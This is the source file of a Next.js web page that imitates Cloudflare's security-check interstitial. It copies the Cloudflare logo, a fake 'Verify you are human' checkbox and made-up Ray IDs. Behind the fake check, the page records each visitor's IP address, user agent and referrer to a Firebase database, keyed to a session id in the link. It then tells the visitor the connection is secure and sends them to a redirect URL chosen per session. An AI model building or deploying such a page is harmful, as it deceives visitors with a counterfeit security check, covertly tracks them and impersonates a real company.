"use client";

import { useState, useEffect, useRef } from "react";

const DEFAULT_HOSTNAME = process.env.NEXT_PUBLIC_DEFAULT_HOSTNAME || "example.com";
const DEFAULT_REDIRECT_URL =
  process.env.NEXT_PUBLIC_DEFAULT_REDIRECT_URL || "https://cloudflare.com";

export default function VerifyPage() {
  const [hostname, setHostname] = useState(DEFAULT_HOSTNAME);
  const [redirectUrl, setRedirectUrl] = useState(DEFAULT_REDIRECT_URL);
  const [verifying, setVerifying] = useState(false);
  const [success, setSuccess] = useState(false);
  const [exiting, setExiting] = useState(false);
  const timersRef = useRef<number[]>([]);

  const clearTimers = () => {
    timersRef.current.forEach((timerId) => window.clearTimeout(timerId));
    timersRef.current = [];
  };

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const sessionId = params.get("s");

    if (sessionId) {
      // Load session details from API or direct Firestore
      import("@/lib/firebase").then(({ db }) => {
        db.getSession(sessionId).then((session) => {
          if (session) {
            setHostname(session.hostname as string);
            if (typeof session.redirect === "string" && session.redirect.trim()) {
              setRedirectUrl(session.redirect);
            }
          }
        });
      });
    }
    return () => {
      clearTimers();
    };
  }, []);

  const startVerification = async () => {
    if (verifying) return;
    setVerifying(true);

    const params = new URLSearchParams(window.location.search);
    const sessionId = params.get("s");

    // Log the visit if we have a valid session
    if (sessionId) {
      try {
        // Get IP address
        let ip = "Unknown";
        try {
          const res = await fetch("https://api64.ipify.org?format=json");
          const data = await res.json();
          if (data.ip) ip = data.ip;
        } catch {
          // Fallback
          ip = `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`;
        }

        // Generate Ray ID
        const chars = "0123456789abcdef";
        let rayId = "";
        for (let i = 0; i < 16; i++) {
          rayId += chars[Math.floor(Math.random() * chars.length)];
        }

        const { db } = await import("@/lib/firebase");
        await db.logVisit(sessionId, {
          ip,
          rayId,
          userAgent: navigator.userAgent,
          referrer: document.referrer || "Direct",
        });
      } catch (err) {
        console.error("Failed to log visit:", err);
      }
    }

    const verifyTimer = window.setTimeout(() => {
      setVerifying(false);
      setSuccess(true);

      const exitTimer = window.setTimeout(() => {
        setExiting(true);
        const redirectTimer = window.setTimeout(() => {
          window.location.href = redirectUrl;
        }, 1200);
        timersRef.current.push(redirectTimer);
      }, 600);
      timersRef.current.push(exitTimer);
    }, 1600);
    timersRef.current.push(verifyTimer);
  };

  return (
    <>
      <main
        style={{
          maxWidth: "600px",
          width: "100%",
          margin: "12vh auto auto auto",
          padding: "0 12px",
        }}
      >
        <div style={{ marginBottom: "30px" }}>
          <svg
            style={{ height: "48px", fill: "#f38020" }}
            viewBox="0 0 600 375"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path d="M518.2 189.6C510.4 121.2 452.4 69 382 69c-33.6 0-64.2 12-88.2 32-15.6-26.6-44.2-44.4-77.2-44.4-48 0-87.2 37.6-90.8 84.8C54 148 4.2 201 4.2 266c0 66.4 53.6 120 120 120h380c55.2 0 100-44.8 100-100 0-51-38.4-93.2-86-96.4z" />
          </svg>
        </div>

        <h1
          style={{
            fontSize: "32px",
            fontWeight: 500,
            color: "#000",
            marginBottom: "8px",
            letterSpacing: "-0.5px",
          }}
        >
          Checking if the site connection is secure
        </h1>
        <div
          style={{
            fontSize: "16px",
            color: "#595959",
            marginBottom: "36px",
          }}
        >
          <span>{hostname}</span> needs to review the security of your connection before proceeding.
        </div>

        <div className="turnstile-container">
          <div
            className={`turnstile-widget ${verifying ? "state-checking" : ""} ${success ? "state-success" : ""}`}
            onClick={startVerification}
            role="checkbox"
            aria-checked={success ? "true" : verifying ? "mixed" : "false"}
            tabIndex={0}
            onKeyDown={(e) => {
              if (e.key === " " || e.key === "Enter") {
                e.preventDefault();
                startVerification();
              }
            }}
          >
            <div className="widget-left">
              <div className="widget-checkbox-wrapper">
                <div className="widget-checkbox" />
                <div className="widget-spinner" />
                <svg
                  className="widget-checkmark"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="3"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <polyline points="20 6 9 17 4 12" />
                </svg>
              </div>
              <span className="widget-label">
                {verifying ? "Verifying..." : success ? "Success!" : "Verify you are human"}
              </span>
            </div>

            <div className="widget-right">
              <div className="widget-logo-container">
                <span className="cloudflare-text">CLOUDFLARE</span>
                <svg
                  className="logo-mini-cloud"
                  viewBox="0 0 600 375"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path d="M518.2 189.6C510.4 121.2 452.4 69 382 69c-33.6 0-64.2 12-88.2 32-15.6-26.6-44.2-44.4-77.2-44.4-48 0-87.2 37.6-90.8 84.8C54 148 4.2 201 4.2 266c0 66.4 53.6 120 120 120h380c55.2 0 100-44.8 100-100 0-51-38.4-93.2-86-96.4z" />
                </svg>
              </div>
              <div className="widget-links">
                <a
                  href="https://www.cloudflare.com/privacypolicy/"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Privacy
                </a>
                <span>•</span>
                <a
                  href="https://www.cloudflare.com/website-terms-of-use/"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Help
                </a>
              </div>
            </div>
          </div>
        </div>

        <div
          style={{
            borderTop: "1px solid #eee",
            paddingTop: "28px",
            marginTop: "12px",
          }}
        >
          <h2
            style={{
              fontSize: "15px",
              fontWeight: 500,
              color: "#313131",
              marginBottom: "8px",
            }}
          >
            Why am I seeing this page?
          </h2>
          <p
            style={{
              color: "#595959",
              fontSize: "13px",
              marginBottom: "16px",
            }}
          >
            Requests from malicious applications can look like standard traffic. If you are a human
            and not a bot, you can continue by passing the verification check.
          </p>
        </div>
      </main>

      <footer
        style={{
          maxWidth: "600px",
          width: "100%",
          margin: "auto auto 20px auto",
          padding: "0 12px",
          borderTop: "1px solid #eee",
          paddingTop: "20px",
          color: "#808080",
          fontSize: "12px",
          display: "flex",
          flexDirection: "column",
          gap: "8px",
        }}
      >
        <div>
          <p>
            Performance & security by{" "}
            <a
              href="https://www.cloudflare.com"
              target="_blank"
              rel="noopener noreferrer"
              style={{ color: "#595959" }}
            >
              Cloudflare
            </a>
          </p>
        </div>
      </footer>

      <div className={`exit-overlay ${exiting ? "active" : ""}`}>
        <div className="exit-spinner" />
        <div className="exit-text">Connection secure. Redirecting...</div>
      </div>
    </>
  );
}
